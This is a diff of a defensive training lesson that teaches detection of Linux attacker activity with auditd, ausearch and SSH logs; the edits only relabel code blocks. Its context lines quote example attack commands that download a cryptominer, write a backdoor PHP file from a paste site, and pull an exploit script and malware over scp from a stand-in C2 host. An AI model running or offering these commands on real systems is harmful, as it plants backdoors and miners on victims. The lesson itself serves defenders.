@@ -96,7 +96,7 @@ Specialized Discovery After the initial Discovery, threat actors might also util
  It is very important to get the context of the Discovery commands. For example, it's a red flag when a web server suddenly spawns `whoami` or when your IT member starts looking for secrets with `find` and `grep`. On the other hand, a network monitoring tool is often expected to periodically `ping` the local network. You can get that context by building a process tree, for example:
 
    Tracing Whoami Origin 
-```Tracing Whoami Origin 
+```bash
 ubuntu@thm-vm:~$ ausearch -i -x whoami # Look for a Discovery command like whoami
 type=PROCTITLE msg=audit(08/25/25 16:28:18.107:985) : proctitle=whoami
 type=SYSCALL msg=audit(08/25/25 16:28:18.107:985) : arch=x86_64 syscall=execve success=yes exit=0 items=2 ppid=3898 pid=3907 auid=ubuntu uid=ubuntu exe=/usr/bin/whoami
@@ -155,13 +155,13 @@ Hack and Forget Attacks After the Discovery stage, threat actors usually reveal 
     Command Usage Example   **Wget** : Download a file from the website `wget https://github.com/xmrig/[...]/xmrig-x64.tar.gz -O /tmp/miner.tar.gz`   **Curl** : Make a request to the webpage `curl --output /var/www/html/backdoor.php "https://pastebin.thm/yTg0Ah6a"`   **SSH** : Transfer a file via [SCP or SFTP](https://www.redhat.com/en/blog/secure-file-transfer-scp-sftp) `scp kali@c2server:/home/kali/cve-2021-4034.sh /tmp/cve-2021-4034.sh`    Like other process creation events, the commands above can be logged with auditd and sometimes appear in Bash history. However, there is a case where process logs aren't helpful. If the victim is reachable over SSH, an attacker can run **scp** or **sftp** from their own system. In this case, you won't see the command on the victim's auditd logs, but you will see a new SSH login! The same principle applies to other file transfer services such as FTP or SMB. Let's see an example:
 
    Option 1: Attacker Connects to Victim 
-```Option 1: Attacker Connects to Victim 
+```bash
 attacker@attack-vm:~$ scp ./malware.sh ubuntu@thm-vm:/tmp[OK] Connecting to thm-vm machine via SSH...[OK] Logged in on thm-vm via SSH as "ubuntu"
 [OK] File transferred from attack-vm to thm-vm[OK] Job is done, logging out from thm-vm# To detect on victim, look for SSH logins in /var/log/auth.log
 ```
 
      Option 2: Victim Connects to Attacker 
-```Option 2: Victim Connects to Attacker 
+```bash
 ubuntu@thm-vm:~$ scp attacker@attack-vm:./malware.sh /tmp
 [OK] Connecting to attack-vm machine via SSH...[OK] Logged in on attack-vm via SSH as "attacker"
 [OK] File transferred from attack-vm to thm-vm[OK] Job is done, logging out from attack-vm# To detect on victim, look for "scp" command in Auditd logs
@@ -289,7 +289,7 @@ Please note that auditd logs can be viewed as **ausearch -i -if /home/ubuntu/sce
 Cryptominer Setup Continuing the Dota3 infection chain, the threat actors have maintained their presence on the victim and now decide whether to install a cryptominer and supplementary malware. Since they already have SSH access, they simply upload the tools via SCP using the previously changed password. Below is an example of how it works:
 
    How Threat Actors Transfer Malware 
-```How Threat Actors Transfer Malware 
+```bash
 user@bot-1672$ scp dota3.tar.gz ubuntu@victim:/tmp
 [OK] Transfered dota3.tar.gz file to the victim
 ```
